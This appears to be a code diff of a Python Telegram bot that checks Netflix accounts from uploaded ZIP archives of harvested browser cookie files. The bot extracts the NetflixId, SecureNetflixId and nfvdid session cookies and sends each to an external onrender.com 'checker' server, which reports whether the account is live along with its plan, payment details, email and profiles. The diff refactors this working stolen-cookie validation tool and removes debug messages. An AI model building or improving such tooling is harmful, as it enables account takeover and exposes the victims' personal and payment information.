@@ -9,50 +9,18 @@ from telegram import ParseMode, InlineKeyboardButton, InlineKeyboardMarkup
 
 BOT_TOKEN = os.environ["BOT_TOKEN"]
 SCRAPE_URL = "https://netflix-checker-3pev.onrender.com/scrape"
+WAKE_URL = "https://netflix-checker-3pev.onrender.com/withdraw?cookie=test"
 
 COOKIE_KEYS = ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"]
 
 def wake_up_server():
     try:
-        requests.get("https://netflix-checker-3pev.onrender.com/withdraw?cookie=test", timeout=60)
+        requests.get(WAKE_URL, timeout=60)
         return True
     except:
         return False
 
-def handle_document(update, context):
-    doc = update.message.document
-
-    if not doc.file_name.lower().endswith(".zip"):
-        return
-
-    chat_id = update.message.chat_id
-
-    # Wake up the scrape server first
-    wake_msg = context.bot.send_message(
-        chat_id=chat_id,
-        text="⏳ <b>Waking up server...</b>\nPlease wait 30-60 seconds...",
-        parse_mode=ParseMode.HTML
-    )
-
-    wake_up_server()
-
-    context.bot.edit_message_text(
-        chat_id=chat_id,
-        message_id=wake_msg.message_id,
-        text="✅ <b>Server is awake!</b>\n📦 Now processing your ZIP file...",
-        parse_mode=ParseMode.HTML
-    )
-
-    # Continue with rest of the code...
-    progress_msg = context.bot.send_message(
-        chat_id=chat_id,
-        text="📦 <b>ZIP file detected!</b>\n⏳ Downloading and extracting...",
-        parse_mode=ParseMode.HTML
-    )
-
 def extract_cookie_from_text(text):
-    # Find the line containing NetflixId in Netscape format
-    # Format: .netflix.com TRUE / TRUE 1234567 NetflixId VALUE
     for line in text.splitlines():
         if "NetflixId" in line and "\t" in line:
             parts = line.split("\t")
@@ -61,9 +29,7 @@ def extract_cookie_from_text(text):
                     if i + 1 < len(parts):
                         value = parts[i + 1].strip()
                         if value:
-                            # Build cookie string
                             cookie_str = f"NetflixId={value}"
-                            # Also look for SecureNetflixId
                             for line2 in text.splitlines():
                                 if "SecureNetflixId" in line2 and "\t" in line2:
                                     parts2 = line2.split("\t")
@@ -72,7 +38,6 @@ def extract_cookie_from_text(text):
                                             if j + 1 < len(parts2):
                                                 cookie_str += f"; SecureNetflixId={parts2[j+1].strip()}"
                                             break
-                            # Also look for nfvdid
                             for line3 in text.splitlines():
                                 if "nfvdid" in line3 and "\t" in line3:
                                     parts3 = line3.split("\t")
@@ -86,9 +51,9 @@ def extract_cookie_from_text(text):
 
 def check_cookie(cookie_raw):
     try:
-        response = requests.post(
+        response = requests.get(
             SCRAPE_URL,
-            data={"cookie": cookie_raw},
+            params={"cookie": cookie_raw},
             timeout=120
         )
         return response.json()
@@ -128,9 +93,9 @@ def format_result(d, index, total, filename):
 
 def handle_start(update, context):
     update.message.reply_text(
-        "👋 <b>Netflix Cookiesd4 Chec Botiu</b>\n\n"
+        "👋 <b>Netflix Cookie CheckerV1 Bot</b>\n\n"
         "📦 Just send me a <b>ZIP file</b> containing Netflix cookie .txt files\n"
-        "I will check eaach account automatically!\n\n"
+        "I will check each account automatically!\n\n"
         "✅ Shows: Status, Plan, Payment, Email, Profiles and more!",
         parse_mode=ParseMode.HTML
     )
@@ -143,9 +108,26 @@ def handle_document(update, context):
 
     chat_id = update.message.chat_id
 
+    # Step 1 - Wake up server
+    wake_msg = context.bot.send_message(
+        chat_id=chat_id,
+        text="⏳ <b>Waking up server...</b>\nPlease wait 30-60 seconds...",
+        parse_mode=ParseMode.HTML
+    )
+
+    wake_up_server()
+
+    context.bot.edit_message_text(
+        chat_id=chat_id,
+        message_id=wake_msg.message_id,
+        text="✅ <b>Server is awake!</b>\n📦 Now downloading your ZIP file...",
+        parse_mode=ParseMode.HTML
+    )
+
+    # Step 2 - Download and process ZIP
     progress_msg = context.bot.send_message(
         chat_id=chat_id,
-        text="📦 <b>ZIP file detected!</b>\n⏳ Downloading and extracting...",
+        text="📦 <b>Downloading and extracting ZIP...</b>",
         parse_mode=ParseMode.HTML
     )
 
@@ -194,24 +176,17 @@ def handle_document(update, context):
                     with open(txt_path, "r", encoding="utf-8", errors="ignore") as f:
                         content = f.read().strip()
 
-                    # Debug first file
-                    if i == 1:
-                        context.bot.send_message(
-                            chat_id=chat_id,
-                            text=f"🔍 DEBUG:\n<code>{repr(content[:500])}</code>",
-                            parse_mode=ParseMode.HTML
-                        )
-
                     if not content:
                         errors += 1
                         continue
 
                     cookie_raw = extract_cookie_from_text(content)
 
-                    if i == 1:
+                    if not cookie_raw:
+                        errors += 1
                         context.bot.send_message(
                             chat_id=chat_id,
-                            text=f"Cookie extracted:\n<code>{cookie_raw[:200]}</code>",
+                            text=f"⚠️ <b>{i}/{total}</b> - <code>{filename}</code>\nCould not extract cookie",
                             parse_mode=ParseMode.HTML
                         )
                         continue
